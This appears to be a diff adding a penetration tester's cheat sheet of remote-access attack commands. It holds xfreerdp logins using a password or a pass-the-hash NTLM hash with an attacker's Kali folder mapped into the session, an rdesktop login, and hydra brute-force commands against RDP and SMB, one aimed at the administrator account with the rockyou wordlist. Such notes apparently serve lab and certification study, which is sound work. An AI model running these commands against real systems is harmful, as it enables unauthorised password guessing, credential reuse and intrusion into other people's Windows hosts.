@@ -1,0 +1,14 @@
+`xfreerdp /u:[domain]\[username] /p:[password] /v:[host] +clipboard /drive:[Windows share name],[kali folder]`
+
+`xfreerdp /u:[domain]\[username] /pth:[hash] /v:[host] +clipboard /drive:[Windows share name],[kali folder]`
+
+`rdesktop -d [domain] -u [username] -p [password] [host]`
+
+`hydra -l [username] -P [wordlist] -s [port] rdp://[host]`
+
+*SMB hydra*
+
+`hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb`
+
+RDP hydra
+`hydra -l [username] -P [wordlist] -s [port] rdp://[host]`
